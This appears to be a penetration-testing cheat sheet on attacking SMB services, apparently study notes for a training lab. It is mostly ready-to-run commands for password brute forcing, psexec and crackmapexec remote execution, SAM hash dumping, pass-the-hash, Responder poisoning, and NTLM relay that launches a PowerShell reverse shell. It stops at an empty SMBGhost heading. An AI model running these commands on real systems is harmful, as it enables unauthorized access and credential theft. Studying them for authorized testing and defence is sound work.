## Enumeration

Refer to Service enumeration.

## Protocol Specific Attacks

### Brute Forcing 

```bash
crackmapexec smb 10.10.110.17 -u /tmp/userlist.txt -p 'Company01!' --local-auth # --local-auth checks for local account instead of domain
```

### Remote Code Execution (RCE)

The PSExec service then creates a named pipe that can send commands to the system.

```bash
## PsExec
impacket-psexec administrator:'Password123!'@10.10.110.17
```

### CrackMapExec Attack Vectors

```bash
## RCE
crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

## Enumerate logged-on users
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users

## Extract hashes from SAM
crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam

## PtH Attack
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

### Forced Authentication Attacks

Abuse the SMB protocol by creating a fake SMB Server to capture users' NetNTLM v1/v2 hashes.

```bash
## Responder - LLMNR, NBT-NS, and MDNS poisoner
sudo responder -I ens33
```

If we cannot crack the hash, we can potentially relay the captured hash to another machine using impacket-ntlmrelayx or Responder MultiRelay.py.

```bash
cat /etc/responder/Responder.conf | grep 'SMB ='

impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146

## Relay the hash to call Powershell
impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e $reverse_shell'
```

## Noticeable SMB Vulnerability

### CVE-2020-0796 (SMBGhost)